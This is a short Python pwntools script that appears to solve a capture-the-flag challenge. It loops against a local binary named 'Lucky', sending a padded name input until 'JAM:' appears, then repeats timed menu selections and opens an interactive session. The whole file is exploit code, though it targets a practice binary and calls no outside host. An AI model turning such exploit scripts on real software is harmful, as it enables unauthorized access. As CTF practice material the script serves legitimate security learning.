from pwn import*

# definition
def menu(sel):
    p.sendlineafter(">> ",str(sel))

def get(time):
    menu(2)
    p.sendlineafter(">> ",str(time))
    sleep(time/2+0.5)   

def exploit(time):
    for i in range(7):
        log.info("Waiting... {}".format(str(i)))
        get(time)
    

# exploit 
while True: 
    p = process('./Lucky')
    p.sendafter(">> ",'a'*19)   # name 
    try:
        p.recvuntil("JAM:")
        print("Sucess !")

    except:
        print("Failed !")
        p.close()
        continue
    
    log.info("Start exploit !")

    exploit(10)
    p.sendline('2')
    p.interactive()



